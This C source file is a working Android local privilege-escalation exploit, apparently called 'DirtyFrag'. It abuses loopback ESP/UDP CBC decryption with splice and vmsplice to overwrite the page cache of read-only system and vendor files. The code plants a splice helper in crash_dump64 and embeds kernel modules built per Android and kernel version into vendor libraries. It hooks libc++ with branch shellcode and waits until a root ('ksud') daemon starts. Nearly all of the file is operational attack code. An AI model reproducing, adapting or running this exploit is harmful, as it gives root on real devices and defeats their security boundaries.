#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"

#define eos(s) (s + strlen(s))

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[16];
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
        _exit(1);
    }
    int st = 0;
    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    return st;
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * source_helper=0: splice the file_fd page into the pipe (file is readable here)
 * source_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 * A fresh pipe is created for every write so the gifted header page and the
 * spliced file page can never alias a previous iteration's buffers.
 */
static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], int source_helper) {
    int ret = -1;
    int pfd[2];
    if (pipe(pfd) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
    fcntl(pfd[1], F_SETPIPE_SZ, 65536);

    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); goto out_pipe;
    }

    if (source_helper) {
        int st = spawn_crash_dump(offset, pfd[1], 1, NULL);
        if (st < 0) goto out_pipe;
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            printf("splice helper failed status=0x%x\n", st);
            goto out_pipe;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            printf("splice file failed: %s\n", strerror(errno)); goto out_pipe;
        }
    }

    ssize_t s = splice(pfd[0], NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); goto out_pipe; }
    ret = 0;
out_pipe:
    close(pfd[0]); close(pfd[1]);
    return ret;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * use_helper=0: system file, read old_content with pread().
 * use_helper=1: vendor file, prefer a direct open()/pread()/splice() and fall back
 *   to the crash_dump64 bridge when the file cannot be opened, or when its first
 *   block cannot be read or written.
 * Returns 0 on success, -1 on failure, and -2 when the first block failed before
 * anything was written, so the caller may retry against another target.
 * len must be a multiple of 16.
 */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    int source_helper = use_helper;
    int direct_tried = 0;
    if (use_helper) {
        /* Vendor libraries are normally readable by untrusted_app (apps load
         * them), so prefer a direct open()+pread()+splice() over the
         * crash_dump64 bridge. The bridge relies on an exec transition and a
         * single page-cache alias that some vendor builds do not observe
         * reliably; fall back to it only when the direct source fails. */
        file_fd = open(path, O_RDONLY | O_CLOEXEC);
        if (file_fd >= 0) {
            source_helper = 0;
            direct_tried = 1;
            printf("vendor target readable directly; using direct file source\n");
        }
    }
    if (!source_helper && file_fd < 0) {
        file_fd = open(path, O_RDONLY | O_CLOEXEC);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int rc = 0;
cbc_retry:
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (source_helper) {
            if (read_vendor_content(off, old_content) < 0) {
                /* -2 means nothing was written yet, so either the caller or
                 * the crash_dump64 fallback below may retry the whole patch. */
                rc = (i == 0) ? -2 : -1;
                break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
                rc = (i == 0) ? -2 : -1;
                break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(sk_send, file_fd, off, iv, source_helper) < 0) {
            printf("write #%zu at 0x%lx failed\n", i, (long)off);
            rc = (i == 0) ? -2 : -1; break;
        }
    }

    /* The vendor target opened but its first block could not be read or
     * written, so nothing has been written yet. Upstream always used the
     * crash_dump64 bridge for vendor files, so fall back to it rather than
     * fail where upstream would have succeeded. A later block failing means a
     * partial write, which must not be retried. */
    if (rc == -2 && direct_tried) {
        printf("vendor target direct source unusable; retrying via crash_dump64\n");
        close(file_fd);
        file_fd = -1;
        source_helper = 1;
        direct_tried = 0;
        rc = 0;
        goto cbc_retry;
    }

    if (!source_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

/* ---- KO and splicehelper blobs ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) {
        printf("uname -r is missing Android version, trying getprop\n");

        char vendor_ver[5];
        char release[15];

        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
        fgets(vendor_ver, sizeof(vendor_ver), f);
        pclose(f);

        sprintf(release, "android");
        sprintf(eos(release), "%s", vendor_ver);

        m = release;
    }
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            printf("patch: crash_dump64 verification failed\n");
            printf("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    return 0;
}

static size_t build_ko_attempts(const char *out[], size_t max);

static int patch_ko(void) {
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    printf("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t len;
    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }

    const char *attempts[4];
    size_t n_attempts = build_ko_attempts(attempts, sizeof(attempts) / sizeof(attempts[0]));

    int ret = -1;
    for (size_t a = 0; a < n_attempts; a++) {
        strncpy(libcxx_ko_target, attempts[a], 63);
        libcxx_ko_target[63] = '\0';
        printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
        ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
        if (ret != -2) break;
        printf("patch: %s failed before writing; trying another vendor target\n",
               libcxx_ko_target);
    }

    /* DirtyFrag can report successful writes that a later read does not
     * observe. Read back a non-ELF interior block (offset 16 differs between
     * ET_REL and ET_DYN) so a reverted page cache is reported instead of
     * surfacing later as a silent timeout. */
    if (ret == 0 && len >= 32) {
        uint8_t back[16];
        int vfd = open(libcxx_ko_target, O_RDONLY | O_CLOEXEC);
        if (vfd >= 0) {
            ssize_t n = pread(vfd, back, sizeof(back), 16);
            if (n == (ssize_t)sizeof(back) && memcmp(back, buf + 16, sizeof(back)) != 0)
                printf("patch: %s read-back mismatch (page cache may have reverted)\n",
                       libcxx_ko_target);
            else if (n == (ssize_t)sizeof(back))
                printf("patch: %s verify OK\n", libcxx_ko_target);
            close(vfd);
        }
    }

    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
    free(buf);
    return ret;
}

/* Invalidate the clean pages we poisoned so a later run (or a later exec)
 * never observes a partially reverted page cache. */
static void fadvise_drop(const char *path) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return;
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    printf("cache dropped: %s\n", path);
}

/* Repair the page caches we poisoned. Kept out of cleanup() on purpose: the
 * libc++ restore may be skipped, but a reverted vendor page must never be left
 * behind for a later exec. */
static void invalidate_patched_pages(void) {
    fadvise_drop(kCrashDump);
    if (libcxx_ko_target) fadvise_drop(libcxx_ko_target);
}

static void cleanup(void) {
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                   (size_t)g_libcxx_r.tramp_aligned, 0);
    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                   (size_t)g_libcxx_r.shell_off, 0);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);

    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    int pos = (int)(hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static const char *const kKoCandidates[] = {
    "/vendor/lib64/libbinderdebug.so",
    "/vendor/lib64/libstagefrighthw.so",
    "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
};

static const char *detect_ko_target(void) {
    for (size_t i = 0; i < sizeof(kKoCandidates) / sizeof(kKoCandidates[0]); i++) {
        if (access(kKoCandidates[i], F_OK) == 0)
            return kKoCandidates[i];
    }
    return kKoCandidates[0];
}

/* Ordered vendor libraries to try for the KO: the detected primary first, then
 * every other candidate that exists. Lets patch_ko() retry a target that could
 * not be read before any byte was written. */
static size_t build_ko_attempts(const char *out[], size_t max) {
    size_t n = 0;
    const char *first = detect_ko_target();
    if (n < max) out[n++] = first;
    for (size_t i = 0; i < sizeof(kKoCandidates) / sizeof(kKoCandidates[0]) && n < max; i++) {
        if (strcmp(kKoCandidates[i], first) == 0) continue;
        if (access(kKoCandidates[i], F_OK) != 0) continue;
        out[n++] = kKoCandidates[i];
    }
    return n;
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes) {
        usage(argv[0]); return 2;
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);

    const char *ko_target = detect_ko_target();
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("found ko_target: %s\n", ko_target);
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
    return 0;
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   &g_libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",    "libc++: loading custom module",                    -1 },
        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                seen[j] = 1;
                printf("%s\n", markers[j].msg);
                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
            }
        }
    }
    printf("timeout: ERROR - check logcat & dmesg\n");
done:
    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
    invalidate_patched_pages();
    return rc;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    int rc = exploit();
    cleanup();
    return rc;
}
